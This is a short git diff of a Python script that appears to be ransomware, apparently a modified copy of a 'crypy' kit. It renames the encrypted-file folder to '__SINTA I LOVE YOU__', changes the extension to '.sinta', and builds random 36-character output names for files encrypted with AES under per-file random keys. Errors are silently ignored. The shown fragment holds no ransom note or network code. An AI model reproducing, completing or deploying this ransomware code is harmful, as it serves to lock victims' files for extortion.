@@ -2,18 +2,19 @@ import os, fnmatch, struct, random, string, base64, platform, sys, time, socket,
 from Crypto import Random
 from Crypto.Cipher import AES
 
-def text_generator(size = 6, chars = string.ascii_uppercase + string.digits):
-    return ''.join((random.choice(chars) for _ in range(size))) + '.crypy'
+encfolder = '__SINTA I LOVE YOU__'
+newextns = 'sinta'
 
+def text_generator(size = 6, chars = string.ascii_uppercase + string.digits):
+    return ''.join((random.choice(chars) for _ in range(size))) + '.' + newextns
 
 def generate_file(file_path, filename):
     key = ''.join([ random.choice(string.ascii_letters + string.digits) for n in xrange(32) ])
-    newfilename = file_path + "chiffre"
+    newfilename = file_path + '\\' + encfolder + '\\' + text_generator(36, '1234567890QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm')
     try:
         encrypt_file(key, filename, newfilename)
     except:
         pass
-
 
 def encrypt_file(key, in_filename, newfilename, out_filename = None, chunksize = 65536, Block = 16):
     if not out_filename:
